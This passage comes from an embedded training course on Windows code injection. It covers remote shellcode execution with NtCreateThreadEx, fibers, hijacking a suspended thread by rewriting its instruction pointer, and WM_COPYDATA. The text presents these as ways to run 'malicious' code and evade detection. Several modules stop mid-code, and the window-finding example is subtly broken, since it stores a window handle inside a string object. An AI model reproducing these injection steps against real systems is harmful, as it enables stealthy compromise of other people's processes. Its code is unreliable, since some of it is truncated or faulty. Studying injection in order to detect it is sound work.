IN SIZE_T StackSize,\n//   IN SIZE_T MaximumStackSize,\n//   IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL\n// );\ntypedef NTSTATUS (NTAPI *PNtCreateThreadEx)(\n    OUT PHANDLE hThread,\n    IN ACCESS_MASK DesiredAccess,\n    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\n    IN HANDLE ProcessHandle,\n    IN PVOID lpStartAddress,\n    IN PVOID lpParameter,\n    IN ULONG Flags, // e.g. THREAD_CREATE_FLAGS_CREATE_SUSPENDED (defined in winternl.h)\n    IN SIZE_T ZeroBits,\n    IN SIZE_T StackSize,\n    IN SIZE_T MaximumStackSize,\n    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL\n);\n\n\n// ... in your code after writing shellcode ...\nPNtCreateThreadEx pNtCreateThreadEx = // ... resolved address ...\n\n// Assuming &#39;hProcess&#39; and &#39;remoteBuffer&#39; (shellcode address) from previous steps\n\nHANDLE hRemoteThread = NULL;\n// We can use an empty OBJECT_ATTRIBUTES for simplicity if not needing specific security/naming\nOBJECT_ATTRIBUTES objAttributes;\nInitializeObjectAttributes(&amp;objAttributes, NULL, 0, NULL, NULL);\n\n// We can use NULL for AttributeList for a basic thread\n// For more advanced control (e.g., hiding the thread), you&#39;d use a PS_ATTRIBUTE_LIST\n\nstatus = pNtCreateThreadEx(\n    &amp;hRemoteThread,         // OUT: Handle to the new thread\n    THREAD_ALL_ACCESS,      // Desired access\n    &amp;objAttributes,         // Object attributes (can be NULL)\n    hProcess,               // Process handle\n    remoteBuffer,           // Start address (our shellcode)\n    NULL,                   // Parameter to pass to the start address (shellcode)\n    0,                      // Flags (e.g., THREAD_CREATE_FLAGS_CREATE_SUSPENDED)\n    0,                      // ZeroBits (usually 0)\n    0,                      // StackSize (0 uses default)\n    0,                      // MaximumStackSize (0 uses default)\n    NULL                    // AttributeList (can be NULL for basic thread)\n);\n\nif (!NT_SUCCESS(status)) {\n    printf(&quot;[-] Failed to create thread via NtCreateThreadEx. Status: 0x%lX\\n&quot;, status);\n    // Clean up allocated memory\n    // SIZE_T freeSize = 0;\n    // NtFreeVirtualMemory(hProcess, &amp;remoteBuffer, &amp;freeSize, MEM_RELEASE);\n    CloseHandle(hProcess);\n    return 1;\n}\n\nprintf(&quot;[+] Created remote thread via NtCreateThreadEx with handle 0x%p.\\n&quot;, hRemoteThread);\n\n// Wait for the thread to finish if necessary\n// WaitForSingleObject(hRemoteThread, INFINITE);\n\n// Clean up handles\nCloseHandle(hRemoteThread);\nCloseHandle(hProcess);\n</code></pre>\n<p><strong>Instructor Notes:</strong></p>\n<ul>\n<li>Defining the Native API function signatures exactly is critical. Tools like PInvoke.net (for C# but useful for signatures), unofficial headers (like `wintern</li>\n</ul>\n\n                </div>\n             </div>\n         ",
    "module-4": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 4: module_4</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve navigated the foundational internals (Module 1), played with the asynchronous power of APCs (Module 2), and dipped our toes into the raw, low-level world of the Native API (Module 3). Now, we&#39;re going even deeper into the rabbit hole of execution control.</p>\n<p>This module, Module 4, is all about exploring <em>alternative</em> ways to make code run in a target process that aren&#39;t your standard <code>CreateRemoteThread</code> or <code>QueueUserAPC</code>. We&#39;ll look at <strong>Fibers</strong>, a form of user-mode cooperative multitasking that can be repurposed, and more critically, <strong>Manual Thread Context Manipulation</strong>, which is essentially pausing a thread and telling the CPU, &quot;Hey, forget what you were doing, jump <em>here</em> instead!&quot; This is powerful stuff, often seen in advanced packers and shellcode loaders, directly referencing the kind of low-level control hinted at in sources like <code>zhasslan.txt</code>.</p>\n<p>We&#39;re moving beyond just <em>providing</em> code to a thread; we&#39;re looking at <em>hijacking</em> the thread&#39;s very execution state. This requires a solid grasp of CPU architecture basics (registers, instruction pointer, stack) and how Windows manages thread context. Don&#39;t worry if assembly is still a bit fuzzy ‚Äì we&#39;ll focus on the concepts and how to apply them using higher-level languages and APIs, but understanding the low-level result is key.</p>\n<p>Let&#39;s dive in!</p>\n<hr>\n<h2>Module 4: Alternative Execution - Fibers and Manual Context Manipulation</h2>\n<p><strong>Module Objective:</strong> By the end of this module, you will understand the concepts of Windows Fibers and Thread Context. You will be able to implement basic local Fiber creation and switching, and understand the process and challenges involved in using manual thread context manipulation (<code>GetThreadContext</code>/<code>SetThreadContext</code>) to redirect execution flow within a target process.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>Solid understanding of Processes, Threads, and Memory Allocation (Module 1).</li>\n<li>Familiarity with Native API concepts and usage (Module 3).</li>\n<li>Basic understanding of CPU registers, instruction pointers (EIP/RIP), and stack pointers (ESP/RSP) is highly recommended. Some exposure to assembly language concepts will be beneficial.</li>\n</ul>\n<hr>\n<h3>Section 4.1: Fibers vs. Threads - Understanding the Difference</h3>\n<p>Alright, let&#39;s start with Fibers. You&#39;ve been working with threads. Threads are the fundamental units of execution scheduled by the Windows kernel. The kernel decides when a thread runs, for how long, and handles the context switching between threads. This is <em>preemptive multitasking</em>. The kernel <em>preempts</em> a thread&#39;s execution to let another one run.</p>\n<p>Fibers are different. Think of them as <strong>user-mode threads</strong> or <strong>coroutines</strong>. They run <em>within</em> a single thread. The key difference? <strong>Fibers are cooperatively scheduled.</strong> This means a Fiber only gives up control when it explicitly calls a function like <code>SwitchToFiber</code>. The kernel doesn&#39;t know or care about individual Fibers; it only sees the <em>thread</em> they are running inside.</p>\n<p>Why do they exist? Historically, they were sometimes used for porting code from systems that used cooperative multitasking. They can also be useful for specific application architectures where you want fine-grained control over scheduling logical tasks within a single thread, perhaps to avoid the overhead of kernel-mode context switches or simplify synchronization within that thread.</p>\n<p><strong>Key Differences Summarized:</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Feature</th>\n<th align=\"left\">Threads</th>\n<th align=\"left\">Fibers</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><strong>Scheduling</strong></td>\n<td align=\"left\">Preemptive (Kernel-managed)</td>\n<td align=\"left\">Cooperative (User-managed via <code>SwitchToFiber</code>)</td>\n</tr>\n<tr>\n<td align=\"left\"><strong>Execution Unit</strong></td>\n<td align=\"left\">Scheduled by the Kernel</td>\n<td align=\"left\">Run <em>within</em> a single Thread</td>\n</tr>\n<tr>\n<td align=\"left\"><strong>Context Switch</strong></td>\n<td align=\"left\">Kernel-mode overhead</td>\n<td align=\"left\">User-mode overhead (lighter)</td>\n</tr>\n<tr>\n<td align=\"left\"><strong>Visibility</strong></td>\n<td align=\"left\">Visible to the Kernel and OS scheduling</td>\n<td align=\"left\">Only visible within the owning Thread</td>\n</tr>\n<tr>\n<td align=\"left\"><strong>Creation</strong></td>\n<td align=\"left\"><code>CreateThread</code>, <code>_beginthreadex</code>, etc.</td>\n<td align=\"left\"><code>CreateFiber</code>, <code>ConvertThreadToFiber</code></td>\n</tr>\n<tr>\n<td align=\"left\"><strong>Management</strong></td>\n<td align=\"left\">Kernel APIs (<code>SuspendThread</code>, etc.)</td>\n<td align=\"left\">Fiber APIs (<code>SwitchToFiber</code>, <code>DeleteFiber</code>)</td>\n</tr>\n</tbody></table>\n<p>So, how might this be relevant for offensive operations? While creating <em>remote</em> Fibers for general injection is complex and often less practical than APCs or remote threads (you still need a target thread to run the Fiber, and getting it into a state to <em>switch</em> to your remote Fiber is tricky), understanding Fibers is important for:</p>\n<ol>\n<li><strong>Completeness:</strong> Knowing <em>all</em> execution contexts.</li>\n<li><strong>Potential Edge Cases:</strong> Maybe a specific application <em>uses</em> Fibers, and there&#39;s a way to hook into that mechanism.</li>\n<li><strong>Conceptual Link:</strong> The idea of manually switching contexts (<code>SwitchToFiber</code>) is conceptually related to manually manipulating a thread&#39;s context (<code>SetThreadContext</code>), which we&#39;ll cover next.</li>\n</ol>\n<p>Let&#39;s look at the core Fiber APIs and a simple local example.</p>\n<h4>Core Fiber APIs</h4>\n<ul>\n<li><code>ConvertThreadToFiber(LPVOID lpParameter)</code>: Converts the <em>current</em> thread into a Fiber. A thread <em>must</em> be converted to a Fiber before it can create or switch to other Fibers. <code>lpParameter</code> is a data value associated with this initial Fiber. Returns a handle to the new Fiber.</li>\n<li><code>CreateFiber(SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter)</code>: Creates a new Fiber. <code>dwStackSize</code> is the stack size (0 uses default). <code>lpStartAddress</code> is the function the Fiber starts executing when switched to. <code>lpParameter</code> is passed to the start routine. Returns a handle to the new Fiber.</li>\n<li><code>SwitchToFiber(LPVOID lpFiber)</code>: Switches execution control from the current Fiber to the specified Fiber (<code>lpFiber</code>). The state of the current Fiber is saved.</li>\n<li><code>DeleteFiber(LPVOID lpFiber)</code>: Deletes a Fiber. You must <em>not</em> delete the currently running Fiber.</li>\n<li><code>GetCurrentFiber()</code>: Returns the address of the currently running Fiber.</li>\n<li><code>GetCurrentFiberId()</code>: Returns the ID of the currently running Fiber (available since Windows 8).</li>\n</ul>\n<h4>Simple Local Fiber Example</h4>\n<p>This example demonstrates creating a couple of Fibers within the main thread and switching between them.</p>\n<pre><code class=\"language-cpp\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n// Function prototypes for our fiber routines\nVOID WINAPI FiberFunc1(LPVOID lpParameter);\nVOID WINAPI FiberFunc2(LPVOID lpParameter);\n\n// Fiber handles\nLPVOID g_mainFiber;\nLPVOID g_fiber1;\nLPVOID g_fiber2;\n\n// Parameter structure (optional, but good for passing data)\ntypedef struct {\n    int id;\n    const char* name;\n} FiberParam;\n\n// Function that Fiber 1 will execute\nVOID WINAPI FiberFunc1(LPVOID lpParameter) {\n    FiberParam* param = (FiberParam*)lpParameter;\n    printf(&quot;Fiber %d (%s): Started.\\n&quot;, param-&gt;id, param-&gt;name);\n\n    // Loop a few times, switching to Fiber 2\n    for (int i = 0; i &lt; 3; ++i) {\n        printf(&quot;Fiber %d (%s): Running iteration %d, switching to Fiber 2.\\n&quot;, param-&gt;id, param-&gt;name, i + 1);\n        SwitchToFiber(g_fiber2); // Switch to Fiber 2\n        printf(&quot;Fiber %d (%s): Switched back from Fiber 2.\\n&quot;, param-&gt;id, param-&gt;name);\n    }\n\n    printf(&quot;Fiber %d (%s): Finished its loop, switching back to Main Fiber.\\n&quot;, param-&gt;id, param-&gt;name);\n    SwitchToFiber(g_mainFiber); // Switch back to the main fiber\n\n    // This part should ideally not be reached if SwitchToFiber is called\n    printf(&quot;Fiber %d (%s): Exiting (should not happen).\\n&quot;, param-&gt;id, param-&gt;name);\n}\n\n// Function that Fiber 2 will execute\nVOID WINAPI FiberFunc2(LPVOID lpParameter) {\n    FiberParam* param = (FiberParam*)lpParameter;\n    printf(&quot;Fiber %d (%s): Started.\\n&quot;, param-&gt;id, param-&gt;name);\n\n    // Loop a few times, switching back to Fiber 1\n    for (int i = 0; i &lt; 2; ++i) { // Loop less times than Fiber 1\n        printf(&quot;Fiber %d (%s): Running iteration %d, switching to Fiber 1.\\n&quot;, param-&gt;id, param-&gt;name, i + 1);\n        SwitchToFiber(g_fiber1); // Switch to Fiber 1\n        printf(&quot;Fiber %d (%s): Switched back from Fiber 1.\\n&quot;, param-&gt;id, param-&gt;name);\n    }\n\n    printf(&quot;Fiber %d (%s): Finished its loop.\\n&quot;, param-&gt;id, param-&gt;name);\n\n    // Fiber 2 is done, it will switch back to whoever switched to it last (likely Fiber 1)\n    // Fiber 1 will then finish and switch back to the main fiber.\n    // If Fiber 2 were switched to directly from main, it would switch back to main.\n    // In this specific flow, Fiber 1 calls Fiber 2 last, so Fiber 2 switching will return to Fiber 1.\n\n    // Note: A Fiber function should typically end with SwitchToFiber\n    // or rely on the flow of calls/switches to return to a valid state.\n    // If a Fiber function simply returns, the behavior can be undefined\n    // unless it&#39;s the last fiber to run before the thread exits or converts back.\n    // In complex scenarios, you might need a designated &quot;cleanup&quot; fiber\n    // or careful state management. For this demo, the flow ensures we return to main.\n}\n\nint main() {\n    printf(&quot;Main Thread: Converting to Fiber.\\n&quot;);\n    // Convert the main thread to a fiber\n    g_mainFiber = ConvertThreadToFiber(NULL);\n    if (!g_mainFiber) {\n        printf(&quot;Error converting main thread to fiber: %lu\\n&quot;, GetLastError());\n        return 1;\n    }\n\n    FiberParam param1 = {1, &quot;Alpha&quot;};\n    FiberParam param2 = {2, &quot;Beta&quot;};\n\n    printf(&quot;Main Thread: Creating Fiber 1.\\n&quot;);\n    // Create Fiber 1\n    g_fiber1 = CreateFiber(0, FiberFunc1, &amp;param1);\n    if (!g_fiber1) {\n        printf(&quot;Error creating Fiber 1: %lu\\n&quot;, GetLastError());\n        DeleteFiber(g_mainFiber);\n        return 1;\n    }\n\n    printf(&quot;Main Thread: Creating Fiber 2.\\n&quot;);\n    // Create Fiber 2\n    g_fiber2 = CreateFiber(0, FiberFunc2, &amp;param2);\n    if (!g_fiber2) {\n        printf(&quot;Error creating Fiber 2: %lu\\n&quot;, GetLastError());\n        DeleteFiber(g_fiber1);\n        DeleteFiber(g_mainFiber);\n        return 1;\n    }\n\n    printf(&quot;Main Thread: Switching to Fiber 1 to start the process.\\n&quot;);\n    // Switch to Fiber 1 to begin the execution flow\n    SwitchToFiber(g_fiber1);\n\n    // Execution returns here when the last fiber switches back to g_mainFiber\n    printf(&quot;Main Thread: Switched back from Fibers. Cleaning up.\\n&quot;);\n\n    // Clean up the created fibers\n    DeleteFiber(g_fiber1);\n    DeleteFiber(g_fiber2);\n    // Note: Do NOT delete g_mainFiber here if the program is about to exit normally.\n    // ConvertFiberToThread is deprecated and not needed for normal exit.\n\n    printf(&quot;Main Thread: Exiting.\\n&quot;);\n    return 0;\n}\n</code></pre>\n<p><strong>Explanation:</strong></p>\n<ol>\n<li>We convert the main thread into a Fiber using <code>ConvertThreadToFiber</code>. This is necessary; a thread must <em>be</em> a Fiber to use <code>SwitchToFiber</code>.</li>\n<li>We create two new Fibers (<code>g_fiber1</code>, <code>g_fiber2</code>) using <code>CreateFiber</code>, specifying their entry point functions (<code>FiberFunc1</code>, <code>FiberFunc2</code>) and optional parameter data.</li>\n<li>We initiate the cooperative multitasking by calling <code>SwitchToFiber(g_fiber1)</code>. The execution context (registers, stack pointer, instruction pointer) of the main Fiber is saved, and the context of <code>g_fiber1</code> is loaded, causing execution to jump to <code>FiberFunc1</code>.</li>\n<li><code>FiberFunc1</code> runs, prints messages, and calls <code>SwitchToFiber(g_fiber2)</code>. Its context is saved, and execution jumps to <code>FiberFunc2</code>.</li>\n<li><code>FiberFunc2</code> runs, prints messages, and calls <code>SwitchToFiber(g_fiber1)</code>. Its context is saved, and execution jumps back to <code>FiberFunc1</code> at the point <em>after</em> its <code>SwitchToFiber(g_fiber2)</code> call.</li>\n<li>This continues until <code>FiberFunc1</code> finishes its loop and calls <code>SwitchToFiber(g_mainFiber)</code>, returning execution to the <code>main</code> function, right after the initial <code>SwitchToFiber(g_fiber1)</code> call.</li>\n<li>Finally, we clean up the created Fibers using <code>DeleteFiber</code>.</li>\n</ol>\n<p><strong>Remote Fiber Injection Considerations:</strong></p>\n<p>As mentioned, remote Fiber injection is complex. You&#39;d need to:</p>\n<ol>\n<li>Allocate memory in the target process.</li>\n<li>Write your shellcode/Fiber function into that memory.</li>\n<li>Find a thread in the target process to &quot;host&quot; your Fiber.</li>\n<li>Get a handle to that thread.</li>\n<li><em>Somehow</em> get that thread to call <code>ConvertThreadToFiber</code> (if it&#39;s not already a Fiber) and then <code>CreateFiber</code> pointing to your injected code, and finally <code>SwitchToFiber</code>. This often involves injecting a <em>small</em> stub that performs these Fiber API calls using techniques from previous modules (like APCs or remote threads) and then cleans itself up.</li>\n<li>The injected Fiber code would need to manage switching and eventually return control appropriately.</li>\n</ol>\n<p>Due to this complexity, it&#39;s not a go-to method for general injection compared to others, but it&#39;s a valid, albeit niche, execution context to be aware of. The project stretch goal focuses on the <em>other</em> technique in this module, which is more commonly seen in low-level loaders/packers: Context Manipulation.</p>\n<hr>\n<h3>Section 4.2: Manual Thread Context Manipulation (<code>GetThreadContext</code>/<code>SetThreadContext</code>)</h3>\n<p>Now, let&#39;s talk about something much more direct and powerful: hijacking a thread&#39;s execution mid-flight by manually altering its state.</p>\n<p>Every thread has an execution <strong>context</strong>. This context is essentially a snapshot of the CPU&#39;s state for that specific thread at a given moment. What does it include?</p>\n<ul>\n<li>All the CPU registers (general-purpose registers like RAX/EAX, RBX/EBX, RCX/ECX, RDX/EDX, RSP/ESP, RBP/EBP, RDI/EDI, RSI/ESI, R8-R15 on x64, etc.).</li>\n<li>The <strong>Instruction Pointer</strong> (RIP on x64, EIP on x86). This is the address of the <em>next instruction</em> the CPU will execute.</li>\n<li>The <strong>Stack Pointer</strong> (RSP on x64, ESP on x86). This points to the current top of the thread&#39;s stack.</li>\n<li>The <strong>Base Pointer</strong> (RBP on x64, EBP on x86). Often used as a frame pointer for function calls.</li>\n<li>Processor flags register.</li>\n<li>Segment registers.</li>\n<li>Floating-point and SIMD state (optional, depending on the context flags).</li>\n</ul>\n<p>This entire state is captured in a structure called <code>CONTEXT</code>. The definition of this structure is quite large and architecture-dependent (different fields for x86 and x64).</p>\n<p>Windows provides APIs to read and write this context:</p>\n<ul>\n<li><code>GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)</code>: Retrieves the context of the specified thread.</li>\n<li><code>SetThreadContext(HANDLE hThread, const CONTEXT* lpContext)</code>: Sets the context of the specified thread.</li>\n</ul>\n<p><strong>The Technique: Hijacking Execution Flow</strong></p>\n<p>The core idea for using context manipulation for code execution is simple in concept, complex in implementation:</p>\n<ol>\n<li>Identify a target thread in the remote process.</li>\n<li><strong>Suspend</strong> the target thread. This is critical. You need the thread&#39;s state to be stable while you read and modify its context. If you don&#39;t suspend it, its registers (especially RIP/EIP) could change between your <code>GetThreadContext</code> and <code>SetThreadContext</code> calls, leading to unpredictable results or crashes.</li>\n<li>Allocate memory in the target process (using techniques from Module 3, like <code>NtAllocateVirtualMemory</code> or <code>VirtualAllocEx</code>).</li>\n<li>Write your shellcode or a small jump stub into the allocated memory (using <code>NtWriteVirtualMemory</code> or <code>WriteProcessMemory</code>).</li>\n<li>Call <code>GetThreadContext</code> to read the current state of the suspended thread.</li>\n<li><strong>Save</strong> the original thread context, or at least the critical parts needed to resume execution later (especially the original RIP/EIP and potentially RSP/ESP).</li>\n<li>Modify the Instruction Pointer (<code>Context.Rip</code> on x64, <code>Context.Eip</code> on x86) in the retrieved <code>CONTEXT</code> structure to point to the address of your injected shellcode/stub.</li>\n<li>Call <code>SetThreadContext</code> to apply the modified context to the suspended thread.</li>\n<li><strong>Resume</strong> the target thread (<code>ResumeThread</code>).</li>\n</ol>\n<p>When the thread resumes, the CPU will load the modified context, including the new Instruction Pointer. Execution will immediately jump to your injected shellcode!</p>\n<p><strong>The Hard Part: Returning Control</strong></p>\n<p>Simply jumping to your shellcode isn&#39;t enough if you want the target process to continue running normally afterward. Your injected shellcode <em>must</em> eventually return control back to the legitimate code flow of the hijacked thread.</p>\n<p>How?</p>\n<ol>\n<li><strong>Option A: Execute and Terminate:</strong> The shellcode performs its task (e.g., spawns a process) and then calls <code>ExitThread</code> or <code>ExitProcess</code>. This works but terminates the hijacked thread or the entire process, which might be noticeable or undesirable.</li>\n<li><strong>Option B: Execute and Restore/Resume:</strong> This is the stealthier but much harder approach. Your shellcode needs to:<ul>\n<li>Perform its malicious task.</li>\n<li><strong>Restore</strong> the original thread context that you saved <em>before</em> modifying the Instruction Pointer. This requires the shellcode to <em>know</em> the saved context. The saved context could potentially be written into the allocated memory along with the shellcode itself, or passed as a parameter if the shellcode is structured to accept one (more complex).</li>\n<li>Once the context is restored, the shellcode needs to jump back to the original RIP/EIP.</li>\n</ul>\n</li>\n</ol>\n<p>This &quot;execute and restore&quot; approach is tricky because:</p>\n<ul>\n<li>The shellcode needs access to the saved context.</li>\n<li>Restoring the context perfectly requires careful assembly code to load all the saved registers.</li>\n<li>The stack (<code>RSP</code>/<code>ESP</code>) needs careful consideration. Does your shellcode use the target thread&#39;s stack? Does it switch to its own temporary stack? When restoring, you need to make sure the stack is in a consistent state for the original code to resume correctly.</li>\n</ul>\n<p>This is where low-level control and understanding assembly become crucial, similar to the techniques used in sophisticated packers and shellcode loaders to seamlessly transfer execution.</p>\n<h4><code>CONTEXT</code> Structure (Simplified View)</h4>\n<p>The <code>CONTEXT</code> structure is defined in <code>winnt.h</code>. Its layout depends heavily on the architecture (<code>#ifdef _M_IX86</code> vs. <code>#ifdef _M_X64</code>). It contains fields like:</p>\n<pre><code class=\"language-c++\">// Simplified structure for illustration (actual struct is much larger)\ntypedef struct _CONTEXT {\n    // ... other fields ...\n    DWORD ContextFlags; // Specifies which parts of the context are valid\n\n    // ... integer registers ...\n#ifdef _M_X64\n    DWORD64 Rip; // Instruction Pointer (x64)\n    DWORD64 Rsp; // Stack Pointer (x64)\n    DWORD64 Rbp; // Base Pointer (x64)\n    // ... other x64 registers (Rax, Rbx, Rcx, Rdx, R8-R15, etc.)\n#else // _M_IX86\n    DWORD Eip; // Instruction Pointer (x86)\n    DWORD Esp; // Stack Pointer (x86)\n    DWORD Ebp; // Base Pointer (x86)\n    // ... other x86 registers (Eax, Ebx, Ecx, Edx, Esi, Edi, etc.)\n#endif\n\n    // ... segment registers, floating point state, etc. ...\n\n} CONTEXT, *PCONTEXT;\n\n// Important ContextFlags values:\n// CONTEXT_i386 or CONTEXT_AMD64: Include integer registers (contains Eip/Rip, Esp/Rsp, Ebp/Rbp)\n// CONTEXT_CONTROL: Include control registers (contains Eip/Rip, Esp/Rsp, Ebp/Rbp, EFlags/EFlags)\n// CONTEXT_FULL: Includes CONTEXT_CONTROL, CONTEXT_INTEGER, and CONTEXT_SEGMENTS\n// CONTEXT_ALL: Includes CONTEXT_FULL and floating-point/SIMD state\n\n// When using GetThreadContext/SetThreadContext for execution hijacking,\n// you typically need at least CONTEXT_CONTROL or CONTEXT_FULL to get/set the instruction pointer.\n</code></pre>\n<h4>Simple Local Context Manipulation Example (Illustrative)</h4>\n<p>Creating a <em>complete</em> remote context manipulation example that handles saving/restoring context and injecting complex shellcode is beyond a simple module example. It involves writing architecture-specific shellcode.</p>\n<p>However, we can demonstrate the <em>mechanics</em> of <code>GetThreadContext</code> and <code>SetThreadContext</code> locally. This example shows how to get the context of the main thread, modify its instruction pointer to jump to a <em>different function</em> within the <em>same</em> process, and then resume.</p>\n<pre><code class=\"language-cpp\">#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n// Function we will redirect execution to\nVOID RedirectedFunction() {\n    printf(&quot;--&gt; Execution successfully redirected here!\\n&quot;);\n    // In a real hijack, shellcode would execute here.\n    // For this simple demo, we&#39;ll just exit the thread to avoid crashing.\n    // A real advanced technique would restore context and jump back.\n    ExitThread(0);\n}\n\nint main() {\n    HANDLE hCurrentThread = GetCurrentThread();\n    DWORD dwThreadId = GetCurrentThreadId();\n\n    printf(&quot;Main Thread (ID: %lu):\n</code></pre>\n\n                </div>\n             </div>\n         ",
    "module-5": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 5: module_5</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, let&#39;s shift gears and get really creative. We&#39;ve looked at the &quot;standard&quot; heavy hitters like APCs, Native API calls, and even the more structured approach of Fibers. Now, we&#39;re going to explore the edges ‚Äì the often-overlooked or less direct methods that leverage standard Windows features in unconventional ways. This is where understanding the <em>system&#39;s design</em> really pays off, allowing us to find execution vectors that might fly under the radar because they don&#39;t look like typical &quot;injection.&quot;</p>\n<p>Remember, the goal isn&#39;t just a list of techniques, but understanding the underlying Windows mechanisms we&#39;re bending to our will. This module is about expanding our toolbox and thinking like a true system artist, finding canvases where others don&#39;t look.</p>\n<hr>\n<h2>Module 5: Thinking Outside the Box - Unconventional Execution Vectors</h2>\n<p><strong>Module Objective:</strong> Explore less common and more creative methods for achieving code execution within a target process by leveraging standard Windows features in unconventional ways.</p>\n<p><strong>Estimated Time:</strong> 4-6 hours (including project work)</p>\n<p><strong>Why This Matters:</strong> Defenders often focus on common injection techniques (<code>CreateRemoteThread</code>, APCs, etc.). By using less conventional methods, we can potentially bypass standard monitoring and detection rules. Furthermore, understanding these methods reveals the sheer flexibility of the Windows API and how seemingly innocuous features can be repurposed. This aligns perfectly with the <code>zhasslan.txt</code> philosophy of deeply understanding the system to exploit its nuances.</p>\n<hr>\n<h3>5.1 Execution via Window Messages (<code>WM_COPYDATA</code>)</h3>\n<p><strong>Concept:</strong> The Windows messaging system is primarily for communication between GUI elements and threads within the <em>same</em> process, or between processes in a structured way. However, specific messages like <code>WM_COPYDATA</code> are designed for inter-process data transfer. While not a direct &quot;run code&quot; button, the mechanism involves the OS temporarily mapping memory between processes, which is a powerful primitive we can potentially leverage or use as a stepping stone.</p>\n<p><strong>How it Works:</strong></p>\n<ol>\n<li><strong>The Windows Message Queue:</strong> Each thread that creates a window typically has a message queue. The thread retrieves messages from this queue (<code>GetMessage</code>, <code>PeekMessage</code>) and dispatches them to the window&#39;s procedure (<code>WndProc</code>).</li>\n<li><strong>Sending Messages:</strong><ul>\n<li><code>SendMessage</code>: Sends a message and waits for the recipient&#39;s <code>WndProc</code> to process it and return a value. Synchronous.</li>\n<li><code>PostMessage</code>: Places a message in the recipient&#39;s queue and returns immediately. Asynchronous.</li>\n</ul>\n</li>\n<li><strong><code>WM_COPYDATA</code>:</strong> This is a special message specifically for passing data between processes. When <code>SendMessage(hWnd, WM_COPYDATA, ..., ...)</code> is called:<ul>\n<li>The <code>lParam</code> parameter is expected to be a pointer to a <code>COPYDATASTRUCT</code>.</li>\n<li>The <code>COPYDATASTRUCT</code> contains fields describing the data: <code>dwData</code> (user-defined value), <code>cbData</code> (size of data), and <code>lpData</code> (pointer to the data <em>in the sending process&#39;s address space</em>).</li>\n<li><strong>Crucial Mechanism:</strong> The operating system temporarily maps the sender&#39;s memory containing the data (<code>lpData</code>) into the <em>recipient&#39;s</em> address space while the <code>WM_COPYDATA</code> message is being processed by the recipient&#39;s <code>WndProc</code>. This allows the recipient to directly access the sender&#39;s data buffer without needing <code>ReadProcessMemory</code>.</li>\n<li>The recipient&#39;s <code>WndProc</code> receives the message, checks if it&#39;s <code>WM_COPYDATA</code>, casts <code>lParam</code> to <code>COPYDATASTRUCT*</code>, and accesses the data via the provided pointer.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Why is this &quot;Unconventional&quot; for Execution?</strong></p>\n<ul>\n<li><code>WM_COPYDATA</code> is <em>intended</em> for data transfer, not code execution.</li>\n<li>Achieving arbitrary code execution <em>directly</em> via <code>WM_COPYDATA</code> usually requires a vulnerability in the <em>target application&#39;s</em> <code>WndProc</code> that mishandles the received data (e.g., copies it to a fixed-size buffer without checking size, interprets <code>dwData</code> or <code>lpData</code> as a function pointer and calls it, etc.). This is more an application exploit than a pure OS-level injection technique like APCs.</li>\n<li><strong>However:</strong><ul>\n<li>The <em>mechanism</em> of mapping memory is interesting and could potentially be part of a more complex chain.</li>\n<li>It can be used as a stealthy <strong>communication channel</strong> for injected code or between malicious components in different processes, bypassing network/file monitoring.</li>\n<li>It can be used to pass pointers to injected shellcode or data <em>if</em> you&#39;ve already managed to inject memory into the target process via another method (like <code>WriteProcessMemory</code> which requires <code>VirtualAllocEx</code>), and the target <code>WndProc</code> is somehow tricked or designed to handle this. (Less likely for arbitrary targets, more for specific application exploits).</li>\n<li>It can be used to trigger <em>existing</em> code paths in the target process by sending specific data values that the <code>WndProc</code> interprets as commands.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Limitations:</strong></p>\n<ul>\n<li>Requires the target process to have a window with a message loop that is actively processing messages.</li>\n<li>Requires knowing the handle (<code>HWND</code>) of a target window.</li>\n<li>Direct arbitrary code execution is unlikely without an application-specific vulnerability.</li>\n</ul>\n<p><strong>Implementation Steps (Sender Side - Sending Data):</strong></p>\n<ol>\n<li>Find the target window handle (<code>HWND</code>). <code>FindWindow</code> or enumeration functions (discussed next) are useful here.</li>\n<li>Prepare the data you want to send in a buffer in <em>your</em> process&#39;s memory.</li>\n<li>Populate a <code>COPYDATASTRUCT</code> with information about your data (size, pointer, optional <code>dwData</code>).</li>\n<li>Call <code>SendMessage</code> with the target window handle, <code>WM_COPYDATA</code>, a <code>wParam</code> (often the sender&#39;s window handle, but can be 0), and the address of your <code>COPYDATASTRUCT</code> as <code>lParam</code>.</li>\n</ol>\n<p><strong>Code Example (Sending WM_COPYDATA):</strong></p>\n<pre><code class=\"language-cpp\">#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n\n// Function to find a window by title substring (basic example)\nHWND FindTargetWindow(const std::wstring&amp; titleSubstring) {\n    HWND hWnd = NULL;\n    // EnumWindows calls the callback function for each top-level window\n    EnumWindows([](HWND hwnd, LPARAM lParam) -&gt; BOOL {\n        wchar_t windowTitle[256];\n        // Check if window is visible and has a title\n        if (IsWindowVisible(hwnd) &amp;&amp; GetWindowTextLength(hwnd) &gt; 0) {\n            GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(windowTitle[0]));\n            std::wstring title = windowTitle;\n            // Check if the title contains the substring\n            if (title.find(*(std::wstring*)lParam) != std::wstring::npos) {\n                *(HWND*)lParam = hwnd; // Store the found handle\n                return FALSE; // Stop enumeration\n            }\n        }\n        return TRUE; // Continue enumeration\n    }, (LPARAM)&amp;titleSubstring); // Pass the substring via lParam\n\n    return *(HWND*)&amp;titleSubstring; // Return the found handle\n}\n\nint main() {\n    // 1. Find the target window (e.g., Notepad)\n    std::wstring targetTitle = L&quot;Untitled - 